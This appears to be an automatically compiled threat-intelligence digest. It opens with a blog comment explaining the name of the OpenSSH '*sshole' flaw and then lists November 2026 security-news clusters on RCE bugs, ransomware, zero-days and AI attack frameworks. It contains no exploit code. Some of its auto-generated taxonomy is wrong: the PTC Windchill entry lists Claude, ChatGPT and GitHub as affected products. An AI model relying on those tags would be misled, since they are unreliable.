Clive Robinson • November 10, 2026 11:22 AM @ ALL, The name given to the vulnerability of “*sshole” is not supposed to be seen as “rude”. The “sshole” is actually a contractin of “SSH hole”. The lead “ ” is part of what makes the vulnerability work. And is based on the *nix password file, where the “ ” was placed in the password field to indicate an account was not to be loged into from the login programe The reason for the lead “*” is it was not a valid character in the password field and thus could be used for “in band signalling” Some of you are possibly old enough to remember the arguments about which was better “C strings or Pascal strings”. C strings used in-band signalling such that a string could be any length, but it alway terminated in the ASCII NUL character (from 1962 that had significant use in “super encryption” devices based on “One Time Tapes from earlier Baudot and ITU 2). Pascal strings used out-of-band signalling, put simply the lead byte was used to store the length of the string. The had advantages and disadvantages. An advantage was that string math was faster, and the first character of the string was not at position zero but position on that was easier for many people to get there heads around and more importantly all characters were valid. The downside was the string had to be 255 or less characters long. Which at first does not appear much of a disadvantage, but when you dig in, it quickly becomes clear that code is easier to make more general with unlimited length strings and is faster and takes up less program “code” store/memory and alows easy machine code tricks… The other issue back then was “return values” from functions. Originally it was a type int that was the size of the machine dataword. For reasons to long to relate this turned out to be a bad idea… So “in band signalling” became the norm under *nix with an integer holding a return / error code. Actual data was usually returned in a memory array that the calling code passed a pointer to into the function. Security wise this is a bad way to do things even though it can be quite efficient.
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: New OpenSSH Vulnerability
  - Published: 2026-11-10T12:02:38+00:00
  - Link: https://www.schneier.com/blog/archives/2026/11/new-openssh-vulnerability.html
  - Summary: It’s a bad one , and it’s been in the code for a decade: A newly disclosed flaw involving OpenSSH and musl, dubbed “*sshole,” allows attackers to log in to certain Alpine Linux and other musl-based Linux accounts configured to block password authentication simply by entering an oversized password. “Oversized” means longer than 256 bytes. Details . Slashdot thread . And another news article .

### Cluster d7028f613a — score 9

- Title: PTC Patches Critical Windchill and FlexPLM Flaw That Could Enable Remote Code Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-12T11:33:15+00:00
- Link: https://thehackernews.com/2026/11/ptc-patches-critical-windchill-and.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-126325

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion, web_shell_backdoor
- actor_attribution: Cl0p
- affected_industries: manufacturing_industrial
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- cve_ids: CVE-2026-12569, CVE-2026-126325
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage, web_shell_backdoor
- actor_attribution: Cl0p
- affected_industries: manufacturing_industrial
- affected_products: Anthropic/Claude, OpenAI/ChatGPT, GitHub
- cve_ids: CVE-2026-126325, CVE-2026-12569
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
PTC has released patches for a new critical vulnerability impacting Windchill and FlexPLM software that, if successfully exploited, could result in remote code execution. The security flaw, tracked as CVE-2026-126325, carries a CVSS v4 score of 9.2 out of a maximum of 10.0. It has been described as a case of improper input validation and deserialization of untrusted data that could result in
```

#### Full body

```
PTC Patches Critical Windchill and FlexPLM Flaw That Could Enable Remote Code Execution  Ravie Lakshmanan  Nov 12, 2026 Vulnerability / Enterprise Security PTC has released patches for a new critical vulnerability impacting Windchill and FlexPLM software that, if successfully exploited, could result in remote code execution. The security flaw, tracked as CVE-2026-126325 , carries a CVSS v4 score of 9.2 out of a maximum of 10.0. It has been described as a case of improper input validation and deserialization of untrusted data that could result in remote code execution via crafted requests. "A critical remote code execution (RCE) vulnerability has been reported in PTC Windchill and PTC FlexPLM," according to a description of the flaw on CVE.org. "The vulnerability may be exploited through the deserialization of untrusted data." The CVE record lists the following versions as affected - PTC Windchill: 11.0 M030, 11.1 M020, 11.2.1.0, 12.0.2.0, 12.1.2.0, 13.0.2.0, 13.1.0.0, 13.1.1.0, 13.1.2.0, 13.1.3.0, 13.1.4.0 PTC FlexPLM: 11.0 M030, 11.1 M020, 11.2.1.0, 12.0.2.0, 12.1.2.0, 13.0.2.0, 13.1.0.0, 13.1.1.0, 13.1.2.0, 13.1.3.0 "If your Windchill or FlexPLM environment is hosted by PTC, the patches have been applied on their behalf. No action is required on your part," PTC said in a statement posted on its website. "If your Windchill or FlexPLM environment is not hosted by PTC, we urge you to apply the patch as soon as possible to help protect your systems." The disclosure comes nearly five months after another critical remote code execution (RCE) issue in Windchill and FlexPLM ( CVE-2026-12569 , CVSS score: 9.3) came under active exploitation. Then, in July 2026, it emerged that threat actors linked to the Cl0p ransomware operation were weaponizing the flaw as part of a data extortion campaign designed to drop JSP web shells and exfiltrate sensitive product data from manufacturing companies and industrial enterprises. "PTC software is a textbook target for initial access brokers and ransomware operators and a significant enabler of triple extortion campaigns," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said in a statement shared with The Hacker News. "It allows malicious actors to reach far and wide within victim networks, encrypt and exfiltrate proprietary data, and disrupt industrial processes. In many cases, the impact across these environments has downstream implications for time-sensitive manufacturing, logistics, and fulfillment processes, resulting in material costs per hour of downtime." Organizations running PTC Windchill and FlexPLM products are recommended to patch exposed systems as soon as possible and monitor for signs of code execution, backdoor access, or web shells on the host. If patching is not an immediate option, it's essential to apply network restrictions to limit the risk of compromise. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  enterprise security , Software Security , Vulnerability ⚡ Top Stories This Week Google Disrupts 1.3 Million-Device Android Botnet, Says TV Box Maker Sold Criminal Access Claude Code's “Don't Ask Again” File Exposes Passwords and Keys in 1,122 Public Copies on GitHub Hackers Target OpenSSH SSHole Flaw Within Hours of Disclosure, Gain Root on Honeypot Microsoft Paint RCE Fix Now Available, but Windows Update Won't Deliver It Hackers Hide Linux Backdoor in Control Web Panel Server to Execute Commands Without Logs OpenSSH Issues Emergency Fix for Flaw Letting Long Passwords Bypass SSH Auth on Alpine Linux OpenAI AI Pipeline Generates 948 Linux Root Escalation Exploits in 30-Hour Run Apple to Start Scanning Publicly Shared iCloud Photos and Files for Harmful Content Debian and Ubuntu APT Flaw Lets MitM Attackers Swap Verified Packages and Run Code as Root Critical Rails Flaw Lets Attackers Write Server Files via Crafted ImageMagick Up
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PTC Patches Critical Windchill and FlexPLM Flaw That Could Enable Remote Code Execution
  - Published: 2026-11-12T11:33:15+00:00
  - Link: https://thehackernews.com/2026/11/ptc-patches-critical-windchill-and.html
  - Summary: PTC has released patches for a new critical vulnerability impacting Windchill and FlexPLM software that, if successfully exploited, could result in remote code execution. The security flaw, tracked as CVE-2026-126325, carries a CVSS v4 score of 9.2 out of a maximum of 10.0. It has been described as a case of improper input validation and deserialization of untrusted data that could result in

### Cluster 186ec3fa79 — score 9

- Title: WhiteArmor gang claims responsibility for latest cyber attack on shipping giant Maersk
- Source: Graham Cluley (practitioner_analysis)
- Published: 2026-11-12T15:12:29+00:00
- Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/whitearmor-gang-cyberattack-maersk
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
Shipping giant Maersk has confirmed that one of its systems was broken into by hackers who have stolen data. The WhiteArmor gang has claimed responsbility for the attack. Read more in my article on the Hot for Security blog.
```

#### Corroborating sources (1)

- **Graham Cluley** (practitioner_analysis)
  - Title: WhiteArmor gang claims responsibility for latest cyber attack on shipping giant Maersk
  - Published: 2026-11-12T15:12:29+00:00
  - Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/whitearmor-gang-cyberattack-maersk
  - Summary: Shipping giant Maersk has confirmed that one of its systems was broken into by hackers who have stolen data. The WhiteArmor gang has claimed responsbility for the attack. Read more in my article on the Hot for Security blog.

### Cluster c4123302e0 — score 9

- Title: Risky Bulletin: Chinese APT exploits SS7, Diameter to spy on targets
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-11-13T03:03:12+00:00
- Link: https://risky.biz/RBNEWS633/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
A Chinese APT exploits the SS7 and Diameter protocols, a remote code execution bug hits Apache, Brazil’s largest port suffers a cyberattack, and Europol takes down three malware operations.
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Chinese APT exploits SS7, Diameter to spy on targets
  - Published: 2026-11-13T03:03:12+00:00
  - Link: https://risky.biz/RBNEWS633/
  - Summary: A Chinese APT exploits the SS7 and Diameter protocols, a remote code execution bug hits Apache, Brazil’s largest port suffers a cyberattack, and Europol takes down three malware operations.

### Cluster 22d75f84e0 — score 9

- Title: Inside the loop: Five AI attack frameworks that never ask permission
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-11-13T16:00:00+00:00
- Link: https://www.elastic.co/security-labs/threat-command/agentic-offensive-frameworks-detection-artex
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Five agentic offensive frameworks act in bursts of two to 25 seconds, and none enforces authorization in code. What ARTEX, CyberStrikeAI, Cairn, PentAGI, and HexStrike leave in your telemetry, and the ES|QL hunt that catches them.
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: Inside the loop: Five AI attack frameworks that never ask permission
  - Published: 2026-11-13T16:00:00+00:00
  - Link: https://www.elastic.co/security-labs/threat-command/agentic-offensive-frameworks-detection-artex
  - Summary: Five agentic offensive frameworks act in bursts of two to 25 seconds, and none enforces authorization in code. What ARTEX, CyberStrikeAI, Cairn, PentAGI, and HexStrike leave in your telemetry, and the ES|QL hunt that catches them.

### Cluster 9a2bede6cc — score 8

- Title: Log Analysis Field Guide: Tips for Spotting Patterns and Red Flags
- Source: Black Hills Information Security (detection_response_operations)
- Published: 2026-11-11T21:57:25+00:00
- Link: https://www.blackhillsinfosec.com/log-analysis-guide/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Imagine you’re a detective, but your crime scene is made of timestamps, IP addresses, and login attempts instead of fingerprints and DNA. Log analysis is the art of reading digital breadcrumbs that attackers leave behind—every click, connection, and failed password gets recorded automatically. Here are some tips for learning how to survey and when to pull out the magnifying glass.
```

#### Corroborating sources (1)

- **Black Hills Information Security** (detection_response_operations)
  - Title: Log Analysis Field Guide: Tips for Spotting Patterns and Red Flags
  - Published: 2026-11-11T21:57:25+00:00
  - Link: https://www.blackhillsinfosec.com/log-analysis-guide/
  - Summary: Imagine you’re a detective, but your crime scene is made of timestamps, IP addresses, and login attempts instead of fingerprints and DNA. Log analysis is the art of reading digital breadcrumbs that attackers leave behind—every click, connection, and failed password gets recorded automatically. Here are some tips for learning how to survey and when to pull out the magnifying glass.

### Cluster 30b30cd7b3 — score 8

- Title: Amazon Threat Intelligence observes threat actors running cybercrime campaigns with ARTEX AI agents
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-11-13T20:26:42+00:00
- Link: https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
From Oct. 3 to Nov. 5, 2026, Amazon’s MadPot, a globally distributed network of decoy threat sensors, captured requests from AI agents that included operating memory from offensive campaigns that threat actors ran on ARTEX, an open-source agentic AI penetration testing framework. The ARTEX agents sent these requests to MadPot sensors configured to present as […]
```

#### Corroborating sources (1)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Amazon Threat Intelligence observes threat actors running cybercrime campaigns with ARTEX AI agents
  - Published: 2026-11-13T20:26:42+00:00
  - Link: https://aws.amazon.com/blogs/security/amazon-threat-intelligence-observes-threat-actors-running-cybercrime-campaigns-with-artex-ai-agents/
  - Summary: From Oct. 3 to Nov. 5, 2026, Amazon’s MadPot, a globally distributed network of decoy threat sensors, captured requests from AI agents that included operating memory from offensive campaigns that threat actors ran on ARTEX, an open-source agentic AI penetration testing framework. The ARTEX agents sent these requests to MadPot sensors configured to present as […]

### Cluster 07872cc4cb — score 8

- Title: Crafty Microsoft Teams Booking Flow Disguises Device Code Phishing
- Source: Huntress (detection_response_operations)
- Published: 2026-11-12T14:00:00+00:00
- Link: https://www.huntress.com/blog/crafty-microsoft-teams-booking-flow-disguises-device-code-phishing
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Threat actors used a convincing Microsoft Teams meeting-booking lure to conceal device code phishing and trick victims into authorizing attacker access.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Crafty Microsoft Teams Booking Flow Disguises Device Code Phishing
  - Published: 2026-11-12T14:00:00+00:00
  - Link: https://www.huntress.com/blog/crafty-microsoft-teams-booking-flow-disguises-device-code-phishing
  - Summary: Threat actors used a convincing Microsoft Teams meeting-booking lure to conceal device code phishing and trick victims into authorizing attacker access.

### Cluster a9ccd4b20f — score 8

- Title: Beyond the clipboard: The evolving tradecraft of ClickFix
- Source: Huntress (detection_response_operations)
- Published: 2026-11-10T14:00:00+00:00
- Link: https://www.huntress.com/blog/the-evolving-tradecraft-of-clickfix
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
ClickFix techniques are evolving. Huntress breaks down four attack chains: lateral movement, hidden PNG payloads, Node.js RATs and cache seeing.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Beyond the clipboard: The evolving tradecraft of ClickFix
  - Published: 2026-11-10T14:00:00+00:00
  - Link: https://www.huntress.com/blog/the-evolving-tradecraft-of-clickfix
  - Summary: ClickFix techniques are evolving. Huntress breaks down four attack chains: lateral movement, hidden PNG payloads, Node.js RATs and cache seeing.

### Cluster 6f25723d11 — score 8

- Title: Inside an AhsayCBS Intrusion: Hidden Webshells, a CryptoMiner, and a C2 Implant
- Source: Huntress (detection_response_operations)
- Published: 2026-11-09T14:00:00+00:00
- Link: https://www.huntress.com/blog/ahsaycbs-webshells
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Follow-up on AhsayCBS intrusion: new webshells, a second miner, and a host-bound Python implant found on exploited backup servers.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Inside an AhsayCBS Intrusion: Hidden Webshells, a CryptoMiner, and a C2 Implant
  - Published: 2026-11-09T14:00:00+00:00
  - Link: https://www.huntress.com/blog/ahsaycbs-webshells
  - Summary: Follow-up on AhsayCBS intrusion: new webshells, a second miner, and a host-bound Python implant found on exploited backup servers.

### Cluster 3b5ec4845b — score 8

- Title: Adapting to AI penetration testing orchestrators: The Modern Security Model
- Source: Cloudflare Security (cloud_identity_infrastructure)
- Published: 2026-11-13T19:26:07+00:00
- Link: https://blog.cloudflare.com/adapting-to-ai-penetration-testing-orchestrators/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
AI-orchestrated penetration testing platforms like ARTEX have become increasingly powerful tools enabling effective attacks on exposed infrastructure. Here we share Cloudflare’s observations and recommended countermeasures.
```

#### Corroborating sources (1)

- **Cloudflare Security** (cloud_identity_infrastructure)
  - Title: Adapting to AI penetration testing orchestrators: The Modern Security Model
  - Published: 2026-11-13T19:26:07+00:00
  - Link: https://blog.cloudflare.com/adapting-to-ai-penetration-testing-orchestrators/
  - Summary: AI-orchestrated penetration testing platforms like ARTEX have become increasingly powerful tools enabling effective attacks on exposed infrastructure. Here we share Cloudflare’s observations and recommended countermeasures.

### Cluster ddcfa6b0fc — score 8

- Title: New Windows SignDrop zero-day gives hackers SYSTEM privileges
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-11-12T16:04:00+00:00
- Link: https://www.bleepingcomputer.com/news/security/new-windows-signdrop-zero-day-gives-hackers-system-privileges/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Security researcher Abdelhamid Naceri (also known as Nightmare Eclipse) has released a new Windows zero-day exploit that can let attackers gain SYSTEM privileges. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New Windows SignDrop zero-day gives hackers SYSTEM privileges
  - Published: 2026-11-12T16:04:00+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-windows-signdrop-zero-day-gives-hackers-system-privileges/
  - Summary: Security researcher Abdelhamid Naceri (also known as Nightmare Eclipse) has released a new Windows zero-day exploit that can let attackers gain SYSTEM privileges. [...]

### Cluster bb40793eff — score 8

- Title: Nightmare Eclipse Drops Windows Zero-Day Exploit ‘SignDrop’
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-11-13T08:50:36+00:00
- Link: https://www.securityweek.com/nightmare-eclipse-drops-windows-zero-day-exploit-signdrop/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
It abuses CLFS and Windows Defender to trigger arbitrary file creation in the context of the antimalware process. The post Nightmare Eclipse Drops Windows Zero-Day Exploit ‘SignDrop’ appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Nightmare Eclipse Drops Windows Zero-Day Exploit ‘SignDrop’
  - Published: 2026-11-13T08:50:36+00:00
  - Link: https://www.securityweek.com/nightmare-eclipse-drops-windows-zero-day-exploit-signdrop/
  - Summary: It abuses CLFS and Windows Defender to trigger arbitrary file creation in the context of the antimalware process. The post Nightmare Eclipse Drops Windows Zero-Day Exploit ‘SignDrop’ appeared first on SecurityWeek .

### Cluster 4da0cee80b — score 8

- Title: US seizes North Korean hacking infrastructure, $1.2 billion in cryptocurrency stolen from Binance
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-11-13T00:32:19+00:00
- Link: https://cyberscoop.com/us-seizes-north-korea-hacking-infrastructure-binance/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: APT38

#### Cluster taxonomy (union across members)
- actor_attribution: APT38
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- actor_attribution: APT38
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The infrastructure, said to belong to APT38, contained footage used to fool victims over video calls. The post US seizes North Korean hacking infrastructure, $1.2 billion in cryptocurrency stolen from Binance appeared first on CyberScoop .
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: US seizes North Korean hacking infrastructure, $1.2 billion in cryptocurrency stolen from Binance
  - Published: 2026-11-13T00:32:19+00:00
  - Link: https://cyberscoop.com/us-seizes-north-korea-hacking-infrastructure-binance/
  - Summary: The infrastructure, said to belong to APT38, contained footage used to fool victims over video calls. The post US seizes North Korean hacking infrastructure, $1.2 billion in cryptocurrency stolen from Binance appeared first on CyberScoop .

### Cluster 8521f25cd6 — score 8

- Title: Vanderbilt University reels following ransomware attack claimed by BYOD group
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-11-10T17:46:29+00:00
- Link: https://cyberscoop.com/vanderbilt-university-ransomware-attack-byod/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: education
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: education
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Some services began returning online Tuesday following a ransomware incident detected on Monday across Vanderbilt systems and applications. The post Vanderbilt University reels following ransomware attack claimed by BYOD group appeared first on CyberScoop .
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Vanderbilt University reels following ransomware attack claimed by BYOD group
  - Published: 2026-11-10T17:46:29+00:00
  - Link: https://cyberscoop.com/vanderbilt-university-ransomware-attack-byod/
  - Summary: Some services began returning online Tuesday following a ransomware incident detected on Monday across Vanderbilt systems and applications. The post Vanderbilt University reels following ransomware attack claimed by BYOD group appeared first on CyberScoop .

### Cluster 5361d6efa7 — score 8

- Title: Extortion Group Luna Moth Flits Into Law Firms a Second Time
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-11-12T20:09:41+00:00
- Link: https://www.darkreading.com/data-privacy/extortion-luna-moth-law-firms-second-time
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The cybercriminals are retargeting law firms that refused to pay its first ransom, with a social engineering con aimed at stealing Microsoft access tokens.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Extortion Group Luna Moth Flits Into Law Firms a Second Time
  - Published: 2026-11-12T20:09:41+00:00
  - Link: https://www.darkreading.com/data-privacy/extortion-luna-moth-law-firms-second-time
  - Summary: The cybercriminals are retargeting law firms that refused to pay its first ransom, with a social engineering con aimed at stealing Microsoft access tokens.

### Cluster b1d2c9c697 — score 8

- Title: New SignDrop Zero-Day Exploit Turns Windows CLFS Security Feature Into SYSTEM Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-12T17:50:27+00:00
- Link: https://thehackernews.com/2026/11/new-signdrop-zero-day-exploit-turns.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Public exploit code released earlier this week claims that a local Windows user can gain SYSTEM privileges through the Common Log File System driver. The proof of concept, called SignDrop, targets a log-authentication feature added to the driver last year. It abuses how clfs.sys creates companion files when a privileged process opens a prepared log, using path redirection to take control of
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New SignDrop Zero-Day Exploit Turns Windows CLFS Security Feature Into SYSTEM Access
  - Published: 2026-11-12T17:50:27+00:00
  - Link: https://thehackernews.com/2026/11/new-signdrop-zero-day-exploit-turns.html
  - Summary: Public exploit code released earlier this week claims that a local Windows user can gain SYSTEM privileges through the Common Log File System driver. The proof of concept, called SignDrop, targets a log-authentication feature added to the driver last year. It abuses how clfs.sys creates companion files when a privileged process opens a prepared log, using path redirection to take control of

### Cluster b5894c9450 — score 8

- Title: Critical Zoom Workplace Flaw Could Allow Unauthenticated Remote Privilege Escalation
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-11T16:12:46+00:00
- Link: https://thehackernews.com/2026/11/critical-zoom-workplace-flaw-could.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-108186

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-108186
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-108186
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Zoom has released software updates to address two security flaws impacting Zoom Workplace for Windows, including a critical bug that could result in privilege escalation on affected systems. The vulnerabilities are listed below - CVE-2026-108186 (CVSS score: 9.6) - An improper input validation vulnerability that could allow an unauthenticated user to conduct an escalation of privilege via
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical Zoom Workplace Flaw Could Allow Unauthenticated Remote Privilege Escalation
  - Published: 2026-11-11T16:12:46+00:00
  - Link: https://thehackernews.com/2026/11/critical-zoom-workplace-flaw-could.html
  - Summary: Zoom has released software updates to address two security flaws impacting Zoom Workplace for Windows, including a critical bug that could result in privilege escalation on affected systems. The vulnerabilities are listed below - CVE-2026-108186 (CVSS score: 9.6) - An improper input validation vulnerability that could allow an unauthenticated user to conduct an escalation of privilege via

### Cluster 91a167d765 — score 8

- Title: France Blames Iran for Sabotage Attack on Refrigeration Controllers at About 700 Retail Sites
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-10T09:08:20+00:00
- Link: https://thehackernews.com/2026/11/france-blames-iran-for-sabotage-attack.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: government, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
An October cyberattack on refrigeration controllers at about 700 French retail sites was carried out by a cyber unit of Iran's Islamic Revolutionary Guard Corps (IRGC), the French government said yesterday. The attackers broke into controllers on the night of October 11 and changed their defrost settings to high temperatures. That caused food losses and, in at least 15 cases, fires. The unit
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: France Blames Iran for Sabotage Attack on Refrigeration Controllers at About 700 Retail Sites
  - Published: 2026-11-10T09:08:20+00:00
  - Link: https://thehackernews.com/2026/11/france-blames-iran-for-sabotage-attack.html
  - Summary: An October cyberattack on refrigeration controllers at about 700 French retail sites was carried out by a cyber unit of Iran's Islamic Revolutionary Guard Corps (IRGC), the French government said yesterday. The attackers broke into controllers on the night of October 11 and changed their defrost settings to high temperatures. That caused food losses and, in at least 15 cases, fires. The unit

### Cluster 97a136a081 — score 8

- Title: Maersk Reveals Data Breach as Extortion Group Demands $5m
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-11-12T08:49:00+00:00
- Link: https://www.infosecurity-magazine.com/news/maersk-data-breach-extortion-group/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Maersk has revealed a threat actor extracted data from one of its legacy systems
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Maersk Reveals Data Breach as Extortion Group Demands $5m
  - Published: 2026-11-12T08:49:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/maersk-data-breach-extortion-group/
  - Summary: Maersk has revealed a threat actor extracted data from one of its legacy systems

### Cluster f5e9ccdee6 — score 8

- Title: Jailbroken AI Agent Ran Two-Week Attack on European Telecom
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-11-09T16:00:00+00:00
- Link: https://www.infosecurity-magazine.com/news/operation-snowball-ai-telecom/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: telecommunications
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: telecommunications
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Jailbroken DeepSeek agent spent two weeks attacking a European telecom, Malbear Labs found
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Jailbroken AI Agent Ran Two-Week Attack on European Telecom
  - Published: 2026-11-09T16:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/operation-snowball-ai-telecom/
